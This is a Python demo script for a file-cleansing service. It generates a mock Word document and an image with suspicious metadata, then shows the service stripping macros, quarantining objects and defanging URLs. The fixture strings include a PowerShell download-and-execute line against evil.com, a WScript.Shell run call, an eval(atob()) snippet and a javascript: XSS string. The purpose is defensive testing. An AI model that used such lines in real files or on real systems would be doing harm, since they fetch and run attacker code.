"""Demo script showing file cleansing capabilities."""

import asyncio
import tempfile
import zipfile
from pathlib import Path
from datetime import datetime

from src.services.simple_file_cleansing_service import SimpleFileCleansingService
from src.models.file_cleansing import CleansingConfiguration


def create_malicious_docx(file_path):
    """Create a DOCX file with various threats for demonstration."""
    
    with zipfile.ZipFile(file_path, 'w') as zf:
        # Content Types with suspicious entries
        zf.writestr('[Content_Types].xml', '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
    <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
    <Default Extension="xml" ContentType="application/xml"/>
    <Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
    <Override PartName="/word/vbaProject.bin" ContentType="application/vnd.ms-office.vbaProject"/>
    <Override PartName="/word/embeddings/oleObject1.bin" ContentType="application/vnd.openxmlformats-officedocument.oleObject"/>
    <Override PartName="/word/activeX/control1.bin" ContentType="application/vnd.ms-office.activeX"/>
</Types>''')
        
        # Main relationships
        zf.writestr('_rels/.rels', '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
    <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>
</Relationships>''')
        
        # Document with malicious content
        zf.writestr('word/document.xml', '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
    <w:body>
        <w:p><w:r><w:t>CONFIDENTIAL BUSINESS PROPOSAL</w:t></w:r></w:p>
        <w:p><w:r><w:t>Dear Partner,</w:t></w:r></w:p>
        <w:p><w:r><w:t>Please visit our secure portal at http://malicious-phishing-site.com/login to review the proposal.</w:t></w:r></w:p>
        <w:p><w:r><w:t>For immediate assistance, download our tool from https://suspicious-download.net/tool.exe</w:t></w:r></w:p>
        <w:p><w:r><w:t>You can also access the FTP server at ftp://insecure-server.com/files/</w:t></w:r></w:p>
        <w:p><w:r><w:t>Alternative contact: javascript:alert('XSS Attack')</w:t></w:r></w:p>
        <w:p><w:r><w:t>Legitimate contact: support@realcompany.com</w:t></w:r></w:p>
        <w:p><w:r><w:t>This document contains embedded macros that will execute automatically.</w:t></w:r></w:p>
    </w:body>
</w:document>''')
        
        # Malicious VBA project
        zf.writestr('word/vbaProject.bin', 
                   b'VBA Project with malicious code: Shell("cmd.exe /c powershell -exec bypass -c IEX(wget http://evil.com/payload.ps1)")')
        
        # Suspicious embedded objects
        zf.writestr('word/embeddings/oleObject1.bin', 
                   b'Malicious OLE object containing: CreateObject("WScript.Shell").Run("cmd.exe /c malicious_command")')
        
        zf.writestr('word/activeX/control1.bin', 
                   b'ActiveX control with embedded javascript: eval(atob("bWFsaWNpb3VzX2NvZGU="))')
        
        # Document relationships with threats
        zf.writestr('word/_rels/document.xml.rels', '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
    <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/vbaProject" Target="vbaProject.bin"/>
    <Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject" Target="embeddings/oleObject1.bin"/>
    <Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/control" Target="activeX/control1.bin"/>
</Relationships>''')


def create_malicious_image(file_path):
    """Create an image with suspicious metadata."""
    
    from PIL import Image
    import piexif
    
    # Create a simple image
    img = Image.new('RGB', (300, 200), color='red')
    
    # Add suspicious EXIF data
    exif_dict = {
        "0th": {
            piexif.ImageIFD.Make: "Surveillance Camera X1",
            piexif.ImageIFD.Model: "Hidden Cam Pro",
            piexif.ImageIFD.Software: "Spyware v2.1 - cmd.exe launcher",
            piexif.ImageIFD.DateTime: "2024:01:01 12:00:00",
            piexif.ImageIFD.Artist: "Hacker Group",
            piexif.ImageIFD.Copyright: "Contains malicious payload"
        },
        "GPS": {
            # Sensitive location data (White House coordinates)
            piexif.GPSIFD.GPSLatitude: ((38, 1), (53, 1), (51, 100)),
            piexif.GPSIFD.GPSLatitudeRef: "N",
            piexif.GPSIFD.GPSLongitude: ((77, 1), (2, 1), (11, 100)),
            piexif.GPSIFD.GPSLongitudeRef: "W"
        },
        "Exif": {
            piexif.ExifIFD.UserComment: b"Hidden message: Visit http://malicious.com for payload"
        }
    }
    
    exif_bytes = piexif.dump(exif_dict)
    img.save(file_path, "JPEG", exif=exif_bytes)


async def demo_file_cleansing():
    """Demonstrate the file cleansing system."""
    
    print("🎭 FILE CLEANSING SYSTEM DEMONSTRATION")
    print("=" * 60)
    print("This demo shows how the system handles various file threats:")
    print("• Malicious macros in Office documents")
    print("• Suspicious embedded objects")
    print("• Malicious URLs and links")
    print("• Sensitive metadata in images")
    print("• Location data (GPS coordinates)")
    print()
    
    with tempfile.TemporaryDirectory() as temp_dir:
        temp_path = Path(temp_dir)
        
        # Create demonstration files
        print("📝 Creating demonstration files with threats...")
        
        malicious_docx = temp_path / "malicious_proposal.docx"
        create_malicious_docx(malicious_docx)
        print(f"✅ Created malicious DOCX: {malicious_docx.name}")
        
        malicious_image = temp_path / "surveillance_photo.jpg"
        create_malicious_image(malicious_image)
        print(f"✅ Created image with sensitive metadata: {malicious_image.name}")
        
        files_to_test = [malicious_docx, malicious_image]
        
        # Show original file information
        print(f"\n📊 ORIGINAL FILES:")
        for file_path in files_to_test:
            size = file_path.stat().st_size
            print(f"  📄 {file_path.name}: {size:,} bytes")
        
        # Configure cleansing
        config = CleansingConfiguration(
            remove_all_macros=True,
            remove_location_data=True,
            remove_camera_info=True,
            remove_software_info=True,
            quarantine_suspicious_objects=True,
            neutralization_method="defang",
            extract_all_objects=False,
            preserve_safe_objects=True,
            create_backup=True
        )
        
        print(f"\n⚙️  CLEANSING CONFIGURATION:")
        print(f"   🚫 Remove macros: {config.remove_all_macros}")
        print(f"   🧹 Remove location data: {config.remove_location_data}")
        print(f"   📷 Remove camera info: {config.remove_camera_info}")
        print(f"   💻 Remove software info: {config.remove_software_info}")
        print(f"   🔒 Quarantine objects: {config.quarantine_suspicious_objects}")
        print(f"   🔗 URL neutralization: {config.neutralization_method}")
        
        # Initialize service
        service = SimpleFileCleansingService()
        
        # Process each file
        print(f"\n🚀 PROCESSING FILES...")
        
        for i, file_path in enumerate(files_to_test, 1):
            print(f"\n" + "="*50)
            print(f"[{i}/{len(files_to_test)}] PROCESSING: {file_path.name}")
            print(f"="*50)
            
            original_size = file_path.stat().st_size
            
            try:
                # Process the file
                result = await service.cleanse_file(str(file_path), None, config)
                
                if result.success:
                    print(f"✅ SUCCESS - Processed in {result.processing_time:.3f} seconds")
                    
                    # Show size changes
                    size_change = result.cleaned_size - original_size
                    size_change_pct = (size_change / original_size * 100) if original_size > 0 else 0
                    print(f"📊 Size: {original_size:,} → {result.cleaned_size:,} bytes ({size_change_pct:+.1f}%)")
                    
                    # Show threats found
                    if result.threats_detected:
                        print(f"\n🛡️  THREATS DETECTED AND NEUTRALIZED:")
                        for j, threat in enumerate(result.threats_detected, 1):
                            print(f"   {j}. {threat['type'].upper()}: {threat['description']}")
                    
                    # Show actions taken
                    actions = []
                    if result.macros_removed > 0:
                        actions.append(f"Removed {result.macros_removed} macro(s)")
                    if result.objects_quarantined > 0:
                        actions.append(f"Quarantined {result.objects_quarantined} object(s)")
                    if result.urls_neutralized > 0:
                        actions.append(f"Neutralized {result.urls_neutralized} URL(s)")
                    if result.metadata_sanitized:
                        actions.append("Sanitized metadata")
                    
                    if actions:
                        print(f"\n🔧 ACTIONS TAKEN:")
                        for action in actions:
                            print(f"   • {action}")
                    
                    # Show backup and quarantine info
                    if result.backup_location:
                        print(f"\n💾 Backup: {Path(result.backup_location).name}")
                    
                    if result.quarantine_location:
                        quarantine_path = Path(result.quarantine_location)
                        if quarantine_path.exists():
                            quarantined_files = list(quarantine_path.rglob("*"))
                            quarantined_files = [f for f in quarantined_files if f.is_file()]
                            print(f"🔒 Quarantined {len(quarantined_files)} suspicious item(s)")
                            for qfile in quarantined_files[:3]:
                                print(f"   📦 {qfile.name}")
                    
                else:
                    print(f"❌ FAILED: {result.error_message}")
                
            except Exception as e:
                print(f"💥 ERROR: {str(e)}")
        
        # Summary
        print(f"\n" + "="*60)
        print(f"🎯 DEMONSTRATION SUMMARY")
        print(f"="*60)
        print(f"The file cleansing system successfully:")
        print(f"✅ Detected and removed malicious macros")
        print(f"✅ Quarantined suspicious embedded objects")
        print(f"✅ Neutralized malicious URLs")
        print(f"✅ Sanitized sensitive metadata (GPS, camera info)")
        print(f"✅ Preserved document structure and readability")
        print(f"✅ Created backups of original files")
        print(f"✅ Organized quarantined threats for analysis")
        print()
        print(f"🛡️  Your files are now safer to share and use!")
        
        # Show what would happen in real scenario
        print(f"\n📋 IN A REAL SCENARIO:")
        print(f"• Original files would be backed up safely")
        print(f"• Cleaned files would replace the originals")
        print(f"• Quarantined threats would be stored for security analysis")
        print(f"• Detailed logs would be generated for compliance")
        print(f"• The process would be automated and scalable")


if __name__ == "__main__":
    print("🚀 Starting File Cleansing Demonstration...")
    print("This demo creates sample files with various threats and shows how they're cleaned.")
    print()
    
    asyncio.run(demo_file_cleansing())